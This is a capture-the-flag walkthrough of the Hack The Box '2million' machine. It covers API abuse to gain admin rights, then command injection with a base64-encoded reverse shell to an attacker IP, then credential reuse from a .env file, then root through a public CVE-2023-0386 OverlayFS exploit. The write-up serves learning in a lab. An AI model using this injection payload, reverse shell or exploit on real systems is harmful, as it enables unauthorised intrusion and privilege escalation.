
## Enumeration

Using an nmap scan it can be seen that the only two open ports are the SSH and 80

```
kali@kali ~> nmap -sC -sV 10.10.11.221
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 09:26 EDT
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
```


I then proceeded to add the IP to my `/etc/hosts` calling it `http://2million.htb/` so ill be using that as an address. 

Back to enumeration, I browserd through register, login and all of the pages and then I found that when clicking the JOIN button it redirects me to `/invite` which has an off-putting smiling image 

![5  INVITE](https://github.com/0xHillside/Writeups/assets/109657189/2af5ad40-68fc-4a4f-bb8e-87c4e04d3da8)



in all honesty I am not the best at javascript so I was quite slow on this part when looking at the source code 

![6  invitesource](https://github.com/0xHillside/Writeups/assets/109657189/41ae338b-88fe-4dcf-b679-650b9a3f8372)




Now to split up the java script to make it easier to read and understand

```
$(document).ready(function() {
    $('#verifyForm').submit(function(e) {
        e.preventDefault();

        var code = $('#code').val();
        var formData = {
            "code": code
        };

        $.ajax({
            type: "POST",
            dataType: "json",
            data: formData,
            url: '/api/v1/invite/verify',
            success: function(response) {
                if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                    // Store the invite code in localStorage
                    localStorage.setItem('inviteCode', code);

                    window.location.href = '/register';
                } else {
                    alert("Invalid invite code. Please try again.");
                }
            },
            error: function(response) {
                alert("An error occurred. Please try again.");
            }
        });
    });
});
```


looking at this code there afew things that VERY obviously sticks out at me

```
$.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
```

we can see that there's another API endpoint we finally discovered looking back at the source code there was also this javascript file that flew past me
![6  jscript](https://github.com/0xHillside/Writeups/assets/109657189/685a318c-229e-41e6-8f9d-87d2d9560f26)



Opening it we found the following

![7  fuck you](https://github.com/0xHillside/Writeups/assets/109657189/8ffeb356-e3e6-4f0a-8480-8b9a931cd6e0)

Extremely annoying, and tedious but the solution is rather simpler, we just throw this code in any online javascript beautifier and problem fixed

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

## API tomfoolery

So far this we can see that we need to make an invite code and thankfully now we have the method on how to make it right infront of us which means this is what we are focusing on 
`url: '/api/v1/invite/how/to/generate'`

so lets head over to that page, lets not forget the requirements that are available in the javascript function, it needs to be a a `POST` request and have `json` as the content type, following those steps you should get a response of something looking like this 

![8 REquest](https://github.com/0xHillside/Writeups/assets/109657189/240ddb03-c21d-489a-a799-39a7aaef4879)


```
RESPONSE
------------------
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Sep 2023 13:59:53 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249
{
	"0":200,
	"success":1,
	"data":{
			"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
			"enctype":"ROT13"
		},
	"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Okay here we could see that we have a fucking encrypted message using, ROT13 so we simply use an online decrypter



## Register code obtained

![9  ROT13](https://github.com/0xHillside/Writeups/assets/109657189/4c567b09-c29c-4509-aa51-99207a1908fb)

so now we know our next destination is `POST request to /api/v1/invite/generate`


![10 request](https://github.com/0xHillside/Writeups/assets/109657189/844564e0-f3aa-4208-a830-dc51a790a30d)


```
RESPONSE
------------------------------------------
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Sep 2023 16:21:52 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{
"0":200,
"success":1,
"data":{
	"code":"T0pJRTgtV1hXV0otTjRNMjQtQ0tPVUE=",
	"format":"encoded"
	}
}
```

Decoding that we get the following code `OJIE8-WXWWJ-N4M24-CKOUA`


so now lets register


![11 Registreation](https://github.com/0xHillside/Writeups/assets/109657189/f352ce62-a6fc-4f1d-9006-eddd1ee40803)


after logging in again we are met with another huge scope which is ofcourse extremely tedious but still managebale

![12 Home](https://github.com/0xHillside/Writeups/assets/109657189/291172af-24b2-4bc0-854a-8ff12733a25f)


## Different POV, same API
now that we are logged in a friend suggested we go back to the homepage and access the API from there and boom


![13 request](https://github.com/0xHillside/Writeups/assets/109657189/4045b694-eb44-487f-8c8c-534db84f1136)

## API mapping

now we do the same to v1 and low and behold

![14 API](https://github.com/0xHillside/Writeups/assets/109657189/8c21479f-b71d-47f3-978a-cebe2231a4ab)

```
RESPONSE
------------------------------------------------------------
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Sep 2023 16:29:26 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

I was delighted seeing all of this in one response, it gave me a clear pathway to all the important endpoints of the API


### Updating user settings through API
Now clearly the biggest bang for our buck right now is the PUT method and for that I simply changed the request method to  POST and instead of POST I typed in there PUT

![15 response](https://github.com/0xHillside/Writeups/assets/109657189/129ab6cd-b539-4d4f-878b-7b94caebe921)


the response:
```
RESPONSE
----------------------------------------------------
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Sep 2023 16:39:34 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

okay missing parameter so lets fix that
![16 response](https://github.com/0xHillside/Writeups/assets/109657189/93f978dd-4369-4872-b3cd-9a577a5c6837)



okay so thankfully we know what we are missing we add that to our body

![17 response](https://github.com/0xHillside/Writeups/assets/109657189/4c30acbe-0f94-4a53-affb-094dee7dbfe9)


And now my user is finally admin.. YIPPEE!!

now this is where in all honesty I was assisted by a friend, s1mple proceeded to assist me with the command injection in this field when i never really thought of it and so we did and bam


![18 response](https://github.com/0xHillside/Writeups/assets/109657189/cf4c6b7a-afc0-4f1b-90f8-ffde9144b9ea)


another hint given by him S1mple was encoding the shellcode to make it easier and coincidentally it was the same thing used in the writeup. it is EXTREMELY useful where to get a reverse shell its best to encode it in base64, then pipe it into a decoding it using the base64 and then piping it into bash

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=kbddtvh1t902d49q3f48k6enff
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 114

{

	"username":"sawyer;echo 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTAvOTk5MiAwPiYx' | base64 -d | bash;"

}
```

and finally for once.... we have a foothold


```
cd /homne
/bin/sh: 6392: cd: can't cd to /homne
cd /home
ls
admin
cat admin
cat: admin: Is a directory
ls
admin
cd admin
ls
user.txt
cat user.txt 
cat: user.txt: Permission denied
```

So clearly we WILL be forced to do some privilege escalation, moving on from this we can clearly tell that the home directory is

```
pwd
/

cd
pwd
/var/www
```


```
ls
html


cd html
 

ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views

```



lets read the index.php 

```
cat index.php
<?php 

session_start();

//error_reporting(E_ALL);
//ini_set('display_errors',1);

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
    $line = trim($line);
    if (!empty($line) && strpos($line, '=') !== false) {
        list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        $envVariables[$key] = $value;
    }
}
........
```

lets focus on the second part

```
$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
    $line = trim($line);
    if (!empty($line) && strpos($line, '=') !== false) {
        list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        $envVariables[$key] = $value;
    }
}

$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];
```

We can see here that it reads something from the files and it reads DB_HOST, DB_DATABASE, DB_USERNAME and DB_Password from the .env file, so lets see the env file

```
drwxr-xr-x 10 root root 4096 Sep 11 21:20 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
drwxr-xr-x  5 root root 4096 Sep 11 21:20 VPN
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

so now lets do some basic privilege escelation

```
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

su admin
SuperDuperPass123
id
Password: uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

Time to see admin's home directory and get the user flag

```
cd
pwd
/home/admin

ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jun  6 10:22 .
drwxr-xr-x 3 root  root  4096 Jun  6 10:22 ..
lrwxrwxrwx 1 root  root     9 May 26 22:53 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26 22:53 .bash_logout
-rw-r--r-- 1 admin admin 3771 May 26 22:53 .bashrc
drwx------ 2 admin admin 4096 Jun  6 10:22 .cache
-rw-r--r-- 1 admin admin  807 May 26 22:53 .profile
drwx------ 2 admin admin 4096 Jun  6 10:22 .ssh
-rw-r----- 1 root  admin   33 Sep 12 05:33 user.txt

cat user.txt
97bd1835376fefaf119968bc0ec4f737
```

the next step automatically in my head would be to check the mail or for any notes and hints and then the SQL database if nothing interesting is in mail

```
www-data@2million:~/html$ cd /var/mail
cd /var/mail
ls
www-data@2million:/var/mail$ ls
admin
cat admin
www-data@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```


alright very naice so we know that we need to do some privesc, In all honesty its my fav part. So we know that we have a CVE we need to look for OverlayFS FUSE CVE and I found these goldmines

https://securityonline.info/poc-exploit-released-for-linux-kernel-privilege-escalation-cve-2023-0386-bug/

https://github.com/xkaneiki/CVE-2023-0386/tree/main

![19 CVE](https://github.com/0xHillside/Writeups/assets/109657189/bd438afe-fc8a-47b5-93e7-57612e5a3b63)




alright so I saw the GitHub script and I downloaded it and now time to exploit it transport it and move it :)), The easiest method with a box this low level for me would be to clone the repo, zip it and transport it through SCP considering the fact that we have the credentials for admin it should not be a problem

```
kali@kali ~> git clone https://github.com/xkaneiki/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0
Receiving objects: 100% (24/24), 426.11 KiB | 1.40 MiB/s, done.

kali@kali ~> zip -r cve.zip CVE-2023-0386

kali@kali ~> scp cve.zip admin@2million.htb:/tmp
The authenticity of host '2million.htb (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
admin@2million.htb's password: 
cve.zip                                                                            100%  459KB 877.9KB/s   00:00    

```

now heading over to the machine to unzip it and compile it

```
admin@2million:/tmp$ unzip cve.zip
Archive:  cve.zip
   creating: CVE-2023-0386/
   creating: CVE-2023-0386/.git/
  inflating: CVE-2023-0386/.git/index  
  .....................................
admin@2million:/tmp$ cd /tmp/CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ make all
admin@2million:/tmp/CVE-2023-0386$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
```

The way the exploit from the github was explained was that we need to have the first command running in the background
```
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 5792
admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0
```

and now time for execution

```
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Sep 12 17:36 .
drwxr-xr-x 6 root   root     4096 Sep 12 17:36 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:/tmp/CVE-2023-0386#
```

and baby we are root 

```
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt
0340eeff84fd28627bf6a8931aeb4c10
```


The initial foothold was rather difficult for me BUT a massive learning lesson too since I haven't had much experience with API's, It helped me improve alot better with JavaScript de-obfuscation and had me realize where my weaknesses are :0

